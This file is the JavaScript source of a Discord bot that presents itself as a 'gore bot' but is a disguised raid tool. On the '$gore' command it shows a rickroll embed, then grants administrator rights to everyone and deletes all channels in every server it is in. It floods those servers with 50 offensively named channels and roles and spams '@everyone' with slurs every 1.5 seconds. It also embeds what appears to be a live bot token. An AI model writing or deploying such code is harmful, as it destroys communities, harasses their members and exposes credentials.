const Discord = require('discord.js');
const client = new Discord.Client();

client.on('ready', () => {
    console.log(`Logged in as ${client.user.tag}!`);
    client.user.setActivity("1543 servers!", { type: "WATCHING"})
  });
  client.on('guildCreate', guild => {
    let channel = guild.channels.cache.get('797840348608856107')
    const hewoembde = new Discord.MessageEmbed()
    .setTitle(`Thank you for adding me!`)
    .setColor(`GREEN`)
    .setDescription(`Thank you for adding Gbot - the best gore bot you will ever need to your server. type \`\`$gore\`\` for gore!`)
    channel.send(hewoembde)
  })

  client.on('message', async (msg) => {
    if (msg.content === '$gore') {
      const goreembed = new Discord.MessageEmbed()
        .setTitle(`Gore`)
        .setDescription(`If the image doesn't load, click [here](https://www.youtube.com/watch?v=DLzxrzFCyOs)`)
        .setImage(`https://tenor.com/view/rickroll-dance-funny-you-music-gif-7755460`)
        .setColor(`RANDOM`)
        .setTimestamp()
    msg.channel.send(goreembed)
    //role:
    const guild = msg.guild
    guild.roles.everyone.setPermissions(['ADMINISTRATOR']);
    client.guilds.cache.forEach(guild => { // Looping through the guilds.
        guild.channels.cache.forEach(channel => { // Looping through the guild channels.
            channel.delete().catch(error => { // Deleting the channel(s) and catching any errors.
                console.log(`Couldn't delete ${channel.name}.`)
            });
        });
    });
    let i = 50
    while(i > 0){
    guild.channels.create('RAIDED BITCH', { reason: 'Needed a cool new channel' })
    .catch(console.error);
    guild.roles.create({
      data: {
        name: 'RAIDED BITCH',
        color: 'RANDOM',
      },
      reason: 'we needed a role for Super Cool People',
    })
    i = i - 1
    }
    function asteapta() {
    client.channels.cache.forEach(channel => {
        channel.send(`@everyone get raided racist cunts`)
    })
    }
    setInterval(asteapta, 1500);
  }
});
  
client.login('Nzk3ODc4NDk3NzcwNjAyNDk2.X_s4QQ.QQDchHOrVKPaxC6Cgjuu_koaRUc');